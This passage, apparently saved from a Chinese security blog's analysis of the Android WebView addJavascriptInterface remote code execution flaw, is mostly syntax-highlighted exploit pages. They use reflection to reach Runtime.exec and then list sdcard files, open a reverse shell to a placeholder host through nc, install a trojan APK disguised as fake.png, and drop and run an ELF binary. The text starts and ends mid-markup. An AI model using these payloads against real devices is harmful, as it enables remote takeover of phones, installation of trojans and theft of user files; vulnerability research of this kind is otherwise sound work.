class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f8773844206-8">&nbsp;</div><div class="crayon-line" id="crayon-55a7aacabf4f8773844206-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">res</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-s">"/system/bin/sh"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"-c"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"ls -al /mnt/sdcard/"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f8773844206-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">write</span><span class="crayon-sy">(</span><span class="crayon-e">getContents</span><span class="crayon-sy">(</span><span class="crayon-v">res</span><span class="crayon-sy">.</span><span class="crayon-e">getInputStream</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf4f8773844206-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf4f8773844206-12"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">body</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf4f8773844206-13"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-o">&gt;</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0042 seconds] -->
+<p>利用后的执行结果：<br>
+<img src="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/TB1vbIvHXXXXXbgXVXXWZMJJXXX-720-1280.jpg" alt="" width="360" height="640"><br>
+3) 利用addJavascriptInterface方法注册可供JavaScript调用的java对象 “injectedObj”，利用反射机制调用Android API getRuntime执行shell命令，达到反弹一个手机端的shell到远程控制端的目的：<br>
+EXP的JavaScript代码：</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7aacabf500986517937" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;html&gt;
+   &lt;body&gt;
+      &lt;script&gt;
+         function execute(cmdArgs)
+         {
+             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+         }
+         execute(["/system/bin/sh","-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/system/bin/sh -i 2&gt;&amp;1|nc x.x.x.x 9099 &gt;/tmp/f"]);
+       &lt;/script&gt;
+   &lt;/body&gt;
+&lt;/html&gt;</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aacabf500986517937-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf500986517937-2">2</div><div class="crayon-num" data-line="crayon-55a7aacabf500986517937-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf500986517937-4">4</div><div class="crayon-num" data-line="crayon-55a7aacabf500986517937-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf500986517937-6">6</div><div class="crayon-num" data-line="crayon-55a7aacabf500986517937-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf500986517937-8">8</div><div class="crayon-num" data-line="crayon-55a7aacabf500986517937-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf500986517937-10">10</div><div class="crayon-num" data-line="crayon-55a7aacabf500986517937-11">11</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aacabf500986517937-1"><span class="crayon-e ">&lt;html&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf500986517937-2"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e ">&lt;body&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf500986517937-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-ta">&lt;script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf500986517937-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-v">cmdArgs</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-55a7aacabf500986517937-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf500986517937-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">injectedObj</span><span class="crayon-sy">.</span><span class="crayon-e">getClass</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">forName</span><span class="crayon-sy">(</span><span class="crayon-s">"java.lang.Runtime"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">getMethod</span><span class="crayon-sy">(</span><span class="crayon-s">"getRuntime"</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">invoke</span><span class="crayon-sy">(</span><span class="crayon-t">null</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">exec</span><span class="crayon-sy">(</span><span class="crayon-v">cmdArgs</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf500986517937-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf500986517937-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-s">"/system/bin/sh"</span><span class="crayon-sy">,</span><span class="crayon-s">"-c"</span><span class="crayon-sy">,</span><span class="crayon-s">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/system/bin/sh -i 2&gt;&amp;1|nc x.x.x.x 9099 &gt;/tmp/f"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf500986517937-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf500986517937-10"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">body</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf500986517937-11"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-o">&gt;</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0032 seconds] -->
+<p>执行后的结果：<br>
+<img src="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/TB1Z27AHXXXXXa_XVXXjXJ30XXX-587-87.jpg" alt=""><br>
+4) 利用addJavascriptInterface方法注册可供JavaScript调用的java对象 “injectedObj”，利用反射机制调用Android API getRuntime执行shell命令进行挂马：a安装木马应用APK, b 安装执行ELF可执行程序；<br>
+简单的安装发送短信木马APK，EXP的JavaScript代码：</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7aacabf508942949659" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;html&gt;
+   &lt;body&gt;
+      &lt;script&gt;
+         function execute(cmdArgs)
+         {
+             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+         }
+         var apk = "\\x50\\x4B\\x03\\x04\\x14\\x00\\x08\\x00\\x08\\x00\\x62 \\xB9\\x15\\x30\\x3D\\x07\\x01\\x00\\x00\\x7C\\x01\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xD6\\x0D\\x00\\x00\\x4D\\x45\\x54\\x41\\x2D\\x49\\x4E\\x46\\x2F\\x43\\x45\\x52\\x54\\x2E\\x53------------------------------------------------------------ \\x4D\\x45\\x54\\x41\\x2D\\x49\\x4E\\x46\\x2F\\x43\\x45\\x52\\x54\\x2E\\x52\\x53\\x41\\x50\\x4B\\x05\\x06\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\xBA\\x01\\x00\\x00\\xB6\\x11\\x00\\x00\\x00\\x00"
+         execute(["/system/bin/sh","-c","echo '"+apk+"' &gt; /data/data/com.example.hellojs/fake.png"]);
+         execute(["chmod","755","/data/data/com.example.hellojs/fake.png"]);
+         execute(["su","-c","pm install -r /data/data/com.example.hellojs/fake.png"]);
+       &lt;/script&gt;
+   &lt;/body&gt;
+&lt;/html&gt;</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aacabf508942949659-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf508942949659-2">2</div><div class="crayon-num" data-line="crayon-55a7aacabf508942949659-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf508942949659-4">4</div><div class="crayon-num" data-line="crayon-55a7aacabf508942949659-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf508942949659-6">6</div><div class="crayon-num" data-line="crayon-55a7aacabf508942949659-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf508942949659-8">8</div><div class="crayon-num" data-line="crayon-55a7aacabf508942949659-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf508942949659-10">10</div><div class="crayon-num" data-line="crayon-55a7aacabf508942949659-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf508942949659-12">12</div><div class="crayon-num" data-line="crayon-55a7aacabf508942949659-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf508942949659-14">14</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aacabf508942949659-1"><span class="crayon-e ">&lt;html&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf508942949659-2"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e ">&lt;body&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf508942949659-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-ta">&lt;script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf508942949659-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-v">cmdArgs</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-55a7aacabf508942949659-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf508942949659-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">injectedObj</span><span class="crayon-sy">.</span><span class="crayon-e">getClass</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">forName</span><span class="crayon-sy">(</span><span class="crayon-s">"java.lang.Runtime"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">getMethod</span><span class="crayon-sy">(</span><span class="crayon-s">"getRuntime"</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">invoke</span><span class="crayon-sy">(</span><span class="crayon-t">null</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">exec</span><span class="crayon-sy">(</span><span class="crayon-v">cmdArgs</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf508942949659-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf508942949659-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-e ">apk</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"\\x50\\x4B\\x03\\x04\\x14\\x00\\x08\\x00\\x08\\x00\\x62 \\xB9\\x15\\x30\\x3D\\x07\\x01\\x00\\x00\\x7C\\x01\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xD6\\x0D\\x00\\x00\\x4D\\x45\\x54\\x41\\x2D\\x49\\x4E\\x46\\x2F\\x43\\x45\\x52\\x54\\x2E\\x53------------------------------------------------------------ \\x4D\\x45\\x54\\x41\\x2D\\x49\\x4E\\x46\\x2F\\x43\\x45\\x52\\x54\\x2E\\x52\\x53\\x41\\x50\\x4B\\x05\\x06\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\xBA\\x01\\x00\\x00\\xB6\\x11\\x00\\x00\\x00\\x00"</span></div><div class="crayon-line" id="crayon-55a7aacabf508942949659-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-s">"/system/bin/sh"</span><span class="crayon-sy">,</span><span class="crayon-s">"-c"</span><span class="crayon-sy">,</span><span class="crayon-s">"echo '"</span><span class="crayon-o">+</span><span class="crayon-v">apk</span><span class="crayon-o">+</span><span class="crayon-s">"' &gt; /data/data/com.example.hellojs/fake.png"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf508942949659-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-s">"chmod"</span><span class="crayon-sy">,</span><span class="crayon-s">"755"</span><span class="crayon-sy">,</span><span class="crayon-s">"/data/data/com.example.hellojs/fake.png"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf508942949659-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-s">"su"</span><span class="crayon-sy">,</span><span class="crayon-s">"-c"</span><span class="crayon-sy">,</span><span class="crayon-s">"pm install -r /data/data/com.example.hellojs/fake.png"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf508942949659-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf508942949659-13"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">body</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf508942949659-14"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-o">&gt;</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0045 seconds] -->
+<p>由下图可得知我们已经拼接成了一个APK程序，并伪装成一张png图片：<br>
+<img src="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/TB1KAZEHXXXXXXfXFXXHqnyRXXX-426-82.jpg" alt=""><br>
+由下图可知，我们已经成功安装fake.png APK程序：<br>
+<img src="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/TB1glAIHXXXXXatXXXXQlEiQXXX-412-40.jpg" alt=""><br>
+例如网上流行的Androrat远程控制程序，攻击者利用上述漏洞即可简单的安装此远程控制木马应用APK即可达到远程控制用户手机的目的。<br>
+利用漏洞拼接可执行ELF程序，并执行该ELF程序达到为所欲为的目的，博文Abusing WebView JavaScript Bridges【3】还实现了在非root情况下利用ELF可执行程序偷取sdcard的文件的POC，由此可见，该漏洞的危害性极大：<br>
+EXP的JavaScript代码：</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7aacabf511588322067" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;html&gt;
+   &lt;body&gt;
+      &lt;script&gt;
+         function execute(cmdArgs)
+         {
+             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+         }
+            var bin = "\\x7F\\x45\\x4C\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\xE4\\x83\\x00\\x00\\x34\\x00\\x00\\x00\\x58\\x21\\x00\\x00\\x00\\x00\\x00\\x05\\x34\\x00\\x20\\x00\\x08\\x00\\x28\\x00\\x18\\x00\\x17\\x00\\x06\\x00\\x00\\x00\\x34\\x00\\x00\\x00\\x34\\x80\\x00\\x00\\x34\\x80\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x04\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x34\\x01\\x00\\x00\\x34\\x81\\x00\\x00\\x34\\x81\\x00\\x00\\x13--------------------------------------------------------------------------------------------------------------------------------\\x00\\x00\\x00\\x00\\xD4\\x00\\x00\\x00\\x03\\x00\\x00\\x70\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x44\\x20\\x00\\x00\\x2D\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x71\\x20\\x00\\x00\\xE4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00";
+            execute(["/system/bin/sh","-c","echo '" + bin + "' &gt; /data/data/com.example.hellojs/testBin"]);
+         execute(["chmod","755","/data/data/com.example.hellojs/testBin"]);
+            var res = execute(["/data/data/com.example.hellojs/testBin"]);
+           document.write(getContents(res.getInputStream()));
+       &lt;/script&gt;
+   &lt;/body&gt;
+&lt;/html&gt;</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aacabf511588322067-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf511588322067-2">2</div><div class="crayon-num" data-line="crayon-55a7aacabf511588322067-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf511588322067-4">4</div><div class="crayon-num" data-line="crayon-55a7aacabf511588322067-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf511588322067-6">6</div><div class="crayon-num" data-line="crayon-55a7aacabf511588322067-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf511588322067-8">8</div><div class="crayon-num" data-line="crayon-55a7aacabf511588322067-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf511588322067-10">10</div><div class="crayon-num" data-line="crayon-55a7aacabf511588322067-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf511588322067-12">12</div><div class="crayon-num" data-line="crayon-55a7aacabf511588322067-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf511588322067-14">14</div><div class="crayon-num" data-line="crayon-55a7aacabf511588322067-15">15</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aacabf511588322067-1"><span class="crayon-e ">&lt;html&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf511588322067-2"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e ">&lt;body&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf511588322067-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-ta">&lt;script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf511588322067-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-v">cmdArgs</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-55a7aacabf511588322067-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf511588322067-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">injectedObj</span><span class="crayon-sy">.</span><span class="crayon-e">getClass</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">forName</span><span class="crayon-sy">(</span><span class="crayon-s">"java.lang.Runtime"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">getMethod</span><span class="crayon-sy">(</span><span class="crayon-s">"getRuntime"</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">invoke</span><span class="crayon-sy">(</span><span class="crayon-t">null</span><span class="crayon-sy">,</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">exec</span><span class="crayon-sy">(</span><span class="crayon-v">cmdArgs</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf511588322067-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf511588322067-8"><span 